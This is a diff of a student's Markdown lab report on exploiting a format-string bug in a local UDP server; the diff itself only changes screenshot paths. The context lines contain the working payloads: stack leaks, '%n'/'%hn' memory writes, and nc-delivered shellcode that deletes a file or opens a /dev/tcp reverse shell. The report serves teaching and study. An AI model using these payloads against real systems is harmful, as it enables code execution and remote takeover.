@@ -8,7 +8,7 @@
 
 Running test:
 
-![image-20201004212800998](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201004212800998.png)
+![image-20201004212800998](./pictures/image-20201004212800998.png)
 
 ### Task2
 
@@ -16,13 +16,13 @@ Running test:
 
 First I use `gdb ./server` and `disass main` to check the return address of myprintf() in the main function.
 
-![image-20201008145917033](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008145917033.png)
+![image-20201008145917033](./pictures/image-20201008145917033.png)
 
 
 
 And then I type the string `%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.` in the client command line window to print contents in the stack, and I get this:
 
-![image-20201008151911207](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008151911207.png)
+![image-20201008151911207](./pictures/image-20201008151911207.png)
 
 Now I see the RA in the stack of myprintf().
 
@@ -44,7 +44,7 @@ The distance is `0x60`.
 
 I input the string `%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s`, and then the program crash, because in some address %s let the pointer accesses an invalid address.
 
-![image-20201008153453510](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008153453510.png)
+![image-20201008153453510](./pictures/image-20201008153453510.png)
 
 ### Task4
 
@@ -56,13 +56,13 @@ In the screenshot of [Task2Q1](#Question1), I use 24 `%.8x` to get first 4 bytes
 
 From [Task4A](#Task4A), using 23 `%.8x` and 1 `%s` to print the secret string.
 
-![image-20201008194902935](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008194902935.png)
+![image-20201008194902935](./pictures/image-20201008194902935.png)
 
 ### Task 5
 
 #### Task5A
 
-![image-20201008202147125](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008202147125.png)
+![image-20201008202147125](./pictures/image-20201008202147125.png)
 
 I use the command `echo $(printf "\x40\xa0\x04\x08")%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n | nc -u localhost 9090` to change the value.
 
@@ -70,7 +70,7 @@ Target value `0x11223344` $\to$ `0x000000bc`.
 
 #### Task5B
 
-![image-20201008202936018](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008202936018.png)
+![image-20201008202936018](./pictures/image-20201008202936018.png)
 
 I must print `5*16*16` bytes before `%n`.
 
@@ -80,7 +80,7 @@ Here is how to calculate 1100: `5*16*16-8*22-4=1100`.
 
 #### Task5C
 
-![image-20201008205034144](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201008205034144.png)
+![image-20201008205034144](./pictures/image-20201008205034144.png)
 
 I must print `0xff99` character before `%hn`(to write in the address `0x0804a042`), and add it to `0x10000` before another `%hn`(to write in the address `0x0804a040`)
 
@@ -106,7 +106,7 @@ And from the [Task4B](#Task4B), I must put 23 `%.8x` first to reach my buf addre
 
 1. First using `echo $(printf "\x76\x26\xba\xbf....\x74\x26\xba\xbf")%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x $(printf "\x90\x90\x90\x90\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") > inputbefore`  and `nc -u localhost 9090 < inputbefore` to check the address of msg.
 
-   ![image-20201009095315212](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009095315212.png)
+   ![image-20201009095315212](./pictures/image-20201009095315212.png)
 
    Here we can see the address of msg is `0xbf8454f0`. So the address of RA is `0xbfe9898c`, the approximate address of the beginning address is `0xbfe98a44`, and I change the 23rd of `%.8x` to `%.48941x (48941 = 0xbfe9-22*8-12)`. 
 
@@ -118,7 +118,7 @@ And from the [Task4B](#Task4B), I must put 23 `%.8x` first to reach my buf addre
 
    And change 24th and 26th `%.8x` to `%hn`.
 
-   ![image-20201009102929055](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009102929055.png)
+   ![image-20201009102929055](./pictures/image-20201009102929055.png)
 
 2. Here is the successful code and screenshots
 
@@ -126,13 +126,13 @@ And from the [Task4B](#Task4B), I must put 23 `%.8x` first to reach my buf addre
 
 
 
-![image-20201009093450790](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009093450790.png)
+![image-20201009093450790](./pictures/image-20201009093450790.png)
 
 
 
 
 
-![image-20201009094907047](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009094907047.png)
+![image-20201009094907047](./pictures/image-20201009094907047.png)
 
 
 
@@ -156,7 +156,7 @@ Task7 is similar to [Task6](#Task6).
 
    Using command`echo $(printf "\x76\x26\xba\xbf....\x74\x26\xba\xbf")%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x $(printf "\x90\x90\x90\x90\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1 \x6870 0\x681/70\x680.0.\x68127.\x68tcp/\x68dev/\x68 > /\x68h -i\x68/bas\x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") > task7before` and `nc -u localhost 9090` to check the address of msg.
 
-   ![task71](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009160130433.png)
+   ![task71](./pictures/image-20201009160130433.png)
 
    Here we can see the address of msg is `0xbf903320`. So the address of RA is `0xbf90331c`, the approximate address of the beginning address is `0xbf9033d4`, and I change the 23rd of `%.8x` to `%.48852x (48852 = 0xbf90-22*8-12)`. 
 
@@ -174,13 +174,13 @@ Task7 is similar to [Task6](#Task6).
 
 
 
-![image-20201009160008072](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009160008072.png)
+![image-20201009160008072](./pictures/image-20201009160008072.png)
 
 
 
 ### Task8
 
-![image-20201009135020643](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009135020643.png)
+![image-20201009135020643](./pictures/image-20201009135020643.png)
 
 Explanation:
 
@@ -192,8 +192,8 @@ Modification:
 
 After modification, the compiler does not give any warning. 
 
-![image-20201009134721687](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009134721687.png)
+![image-20201009134721687](./pictures/image-20201009134721687.png)
 
 The attack does not work, here is an example.
 
-![image-20201009134850857](C:\Users\Lori\Desktop\Course\ComputerScience\计安\lab3\pictures\image-20201009134850857.png)
+![image-20201009134850857](./pictures/image-20201009134850857.png)
